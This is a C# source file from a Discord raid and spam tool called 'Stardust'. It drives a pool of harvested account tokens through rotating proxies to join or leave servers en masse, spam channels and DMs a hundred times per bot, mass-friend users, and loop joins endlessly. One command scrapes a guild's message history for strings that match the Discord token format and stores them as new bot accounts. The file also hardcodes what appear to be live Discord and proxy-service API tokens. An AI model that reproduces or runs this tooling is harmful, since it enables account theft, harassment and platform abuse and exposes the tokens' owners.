using Stardust.API;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Stardust.Classes;
using System.Net.Http;
using Newtonsoft.Json;
using System.Text.RegularExpressions;

namespace Stardust.Utils
{
    public static class GlobalUtils
    {
        public static List<string> AuthCookies = new List<string>();

        public static List<DustProxy> Proxies = new List<DustProxy>();

        public static List<DiscordClient> LoadedClients = new List<DiscordClient>();

        public static void HandleCommand(string command)
        {
            var arguments = command.Split(' ').ToList();
            switch(arguments[0].ToLower())
            {
                case "join":
                    if (arguments.Count() < 2)
                        return;

                    if (arguments[1] == "all")
                        arguments[1] = AuthCookies.Count().ToString();

                    int amount = Convert.ToInt32(arguments[1]);
                    string where = arguments[3];

                    for (int i = 0; i < amount; i++)
                    {
                        new Thread(async () =>
                        {
                            var clientd = new DiscordClient(GetRandomToken());
                            LoadedClients.Add(clientd);
                            await clientd.JoinServer(where);
                        }).Start();
                    }
                    break;
                case "send":
                    if (arguments.Count() < 1)
                        return;

                    string channelid = arguments[1];
                    string msg = String.Join(" ", command.Split(' ').Skip(2));

                    for(int i = 0; i < LoadedClients.Count; i++)
                    {
                        var clientx = LoadedClients[i];
                        new Thread(async () =>
                        {
                            for (var j = 0; j < 100; j++)
                            {
                                await clientx.SendMessage(channelid, msg);
                            }
                        }).Start();
                    }
                    break;
                case "refresh":
                    AuthCookies = File.ReadAllLines("Accounts.txt").ToList();
                    FetchProxies();
                    Console.Title = $"~✦ ✧ S t a r d u s t ✧ ✦~ - root@stardust:~$ - ✦~ Bots: {File.ReadAllLines("Accounts.txt").Count()} ~✦ Proxies: {GlobalUtils.Proxies.Count()}";
                    break;
                case "scrape":
                    try
                    {
                        int count = Convert.ToInt32(arguments[1]);
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", "Nzk3NTg4MTIzODM5NjI3MzE0.X_oqOA.mu1BH8eNsdbDFKWU7poqo_GLTbA");
                        for (int i = 0; i < count; i++)
                        {
                            var response = client.GetAsync($"https://discord.com/api/v8/guilds/752725933131300964/messages/search?content=Haspaymentatt%3A%20false&offset={25 * i}");
                            var search = JsonConvert.DeserializeObject<SearchResult>(response.Result.Content.ReadAsStringAsync().Result);
                            for (int x = 0; x < search.messages.Count(); x++)
                            {
                                for (var z = 0; z < search.messages[x].Count(); z++)
                                {
                                    var lolmsg = search.messages[x][z];
                                    var rg = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
                                    var results = rg.Matches(lolmsg.content);
                                    foreach (Match match in results)
                                    {
                                        if (!AuthCookies.Contains(match.Value))
                                        {
                                            AuthCookies.Add(match.Value);
                                            File.AppendAllText("Accounts.txt", $"{match.Value}\r\n");
                                        }
                                    }
                                }
                            }
                        }
                        Console.Title = $"~✦ ✧ S t a r d u s t ✧ ✦~ - root@stardust:~$ - ✦~ Bots: {File.ReadAllLines("Accounts.txt").Count()} ~✦ Proxies: {GlobalUtils.Proxies.Count()}";
                    }
                    catch { }
                    break;
                case "leave":
                    if (arguments.Count() < 2)
                        return;

                    if (arguments[1] == "all")
                        arguments[1] = AuthCookies.Count().ToString();

                    string guildid = arguments[2];
                    int amount2 = Convert.ToInt32(arguments[1]);

                    for (int i = 0; i < amount2; i++)
                    {
                        new Thread(async () =>
                        {
                            var clientd = new DiscordClient(GetRandomToken());
                            LoadedClients.Add(clientd);
                            await clientd.LeaveServer(guildid);
                        }).Start();
                    }
                    break;
                case "load":

                    if (arguments.Count() < 2)
                        return;

                    if (arguments[1] == "all")
                        arguments[1] = AuthCookies.Count().ToString();

                    for (int i = 0; i < Convert.ToInt32(arguments[1]); i++)
                    {
                        new Thread(() =>
                        {
                            var clientd = new DiscordClient(GetRandomToken());
                            LoadedClients.Add(clientd);
                        }).Start();
                    }
                    break;
                case "react":
                    string chanid = arguments[1];
                    string messageid = arguments[2];
                    string emote = arguments[3];

                    for (int i = 0; i < LoadedClients.Count; i++)
                    {
                        var clientx = LoadedClients[i];
                        new Thread(async () =>
                        {
                            await clientx.React(chanid, messageid, emote);
                        }).Start();
                    }
                    break;
                case "dm":
                    string who = arguments[1];

                    string msglol = String.Join(" ", command.Split(' ').Skip(2));

                    for (int i = 0; i < LoadedClients.Count; i++)
                    {
                        var clientx = LoadedClients[i];
                        new Thread(async () =>
                        {
                            var chanid2 = await clientx.CreateChannel(who);
                            for (var j = 0; j < 100; j++)
                            {
                                await clientx.SendMessage(Convert.ToString(chanid2), msglol);
                            }
                        }).Start();
                    }
                    break;
                case "friend":
                    string what = arguments[1];

                    for (int i = 0; i < Convert.ToInt32(AuthCookies.Count()); i++)
                    {
                        new Thread(async () =>
                        {
                            var clientd = new DiscordClient(GetRandomToken());
                            LoadedClients.Add(clientd);
                            await clientd.Friend(what);
                        }).Start();
                    }
                    break;
                case "verify":
                    string whathow = arguments[1];
                    string json = arguments[2];

                    for (int i = 0; i < LoadedClients.Count; i++)
                    {
                        var clientx = LoadedClients[i];
                        new Thread(async () =>
                        {
                            await clientx.AcceptConditions(whathow, null);
                        }).Start();
                    }
                    break;
                case "test":
                    while(true)
                    {
                        var clientx = new AnonClient();
                        new Thread(async () =>
                        {
                            await clientx.UploadVideoAsync("https://cdn.discordapp.com/attachments/797374779220951040/797380576088424468/0944228503c193e496b1553f3c07503a.mp4", "34744155392766572005206429559955.mp4");
                            //Console.WriteLine(await clientx.Dislike("https://anonvideos.com/videos/1313/ameliamika/?mode=async&format=json&action=rate&video_id=1313&album_id=&playlist_id=&model_id=&cs_id=&post_id=&dvd_id=&vote=0", "1313"));
                        }).Start();
                    }
                case "welcome":
                    if (arguments.Count() < 2)
                        return;

                    if (arguments[1] == "all")
                        arguments[1] = AuthCookies.Count().ToString();

                    int amount3 = Convert.ToInt32(arguments[1]);
                    string where2 = arguments[3];

                    while(true)
                    {
                        for (int i = 0; i < amount3; i++)
                        {
                            new Thread(async () =>
                            {
                                var clientd = new DiscordClient(GetRandomToken());
                                LoadedClients.Add(clientd);
                                await clientd.JoinServer(where2);
                            }).Start();
                        }
                    }
            }
        }

        public static void FetchProxies()
        {
            if (!File.Exists("Proxies.txt"))
            {
                Console.Clear();
                ConsoleUtils.Write("\t\t\t" + "/ Fetching Proxies /");
                HttpClient client = new HttpClient();
                client.DefaultRequestHeaders.Add("Authorization", "Token ba3e453b87f593aee7af2ccdafaf2ebf3a899673");
                for (var i = 1; i < 39; i++)
                {
                    Console.Clear();
                    ConsoleUtils.Write("\t\t\t" + $"- Fetching List {i} -");
                    var response = client.GetAsync($"https://proxy.webshare.io/api/proxy/list/?page={i}").Result;
                    var result = response.Content.ReadAsStringAsync().Result;
                    var res = JsonConvert.DeserializeObject<ProxyList>(result);
                    int sortedproxy = 0;
                    foreach (var proxy in res.results)
                    {
                        sortedproxy++;
                        if (Proxies.Where(x => x.IP == proxy.proxy_address).Count() == 0)
                        {
                            ConsoleUtils.Write("\t\t\t" + @"\ " + sortedproxy + @" Sorted Proxy \");
                            Proxies.Add(new DustProxy(proxy.proxy_address, proxy.username, proxy.password, proxy.ports.http));
                            File.AppendAllText("Proxies.txt", $"{proxy.proxy_address}:{proxy.ports.http}:{proxy.username}:{proxy.password}\r\n");
                        }
                    }
                }
            }
            else
            {
                var lines = File.ReadAllLines("Proxies.txt").ToList();
                foreach(var line in lines)
                {
                    var proxy = new DustProxy(line.Split(':')[0], line.Split(':')[2], line.Split(':')[3], line.Split(':')[1]);
                    Proxies.Add(proxy);
                }
            }
        }

        public static WebProxy GetRandomProxy()
        {
            var proxyinfo = Proxies[new Random().Next(0, Proxies.Count())];
            WebProxy proxy = new WebProxy
            {
                Address = new Uri($"http://{proxyinfo.IP}"),
                Credentials = new NetworkCredential(proxyinfo.Username, proxyinfo.Password)
            };
            return proxy;
        }
            
        public static string GetRandomToken()
        {
            return AuthCookies[new Random().Next(0, AuthCookies.Count())];
        }

        public static void Draw(string text)
        {
            Console.Clear();
            Console.Title = $"~✦ ✧ S t a r d u s t ✧ ✦~ - {text} ~✦";
            Console.WriteLine(new WebClient().DownloadString("https://pastebin.com/raw/9qH5H5gZ"));
        }
    }
}
